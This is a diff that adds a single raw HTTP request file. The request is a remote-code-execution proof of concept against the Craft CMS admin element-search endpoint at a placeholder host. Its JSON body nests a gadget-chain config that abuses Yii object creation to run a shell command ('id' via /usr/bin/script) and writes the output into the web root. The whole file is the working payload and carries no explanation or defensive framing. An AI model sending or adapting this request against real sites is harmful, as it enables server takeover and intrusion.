@@ -1,0 +1,18 @@
+POST /admin/actions/element-search/search HTTP/2
+Host: TARGET
+Cookie: CRAFT_CSRF_TOKEN=xxx; craft_session=xxx
+Content-Type: application/json
+Accept: application/json
+X-CSRF-Token: <csrfTokenValue from /admin/dashboard response body>
+Origin: https://TARGET
+Referer: https://TARGET/admin/dashboard
+
+{
+  "elementType": "craft\\elements\\Category",
+  "siteId": 1,
+  "search": "",
+  "condition": {
+    "class": "craft\\elements\\conditions\\ElementCondition",
+    "config": "{\"elementType\":\"craft\\\\elements\\\\Category\",\"fieldLayouts\":[{\"as rce\":{\"__class\":\"yii\\\\behaviors\\\\AttributeTypecastBehavior\",\"__construct()\":[{\"attributeTypes\":{\"typecastBeforeSave\":[\"Psy\\\\Readline\\\\Hoa\\\\ConsoleProcessus\",\"execute\"]},\"typecastBeforeSave\":\"/usr/bin/script -q -c id /var/www/html/web/craft_burp_id.txt\"}]},\"on *\":\"self::beforeSave\"}]}"
+  }
+}
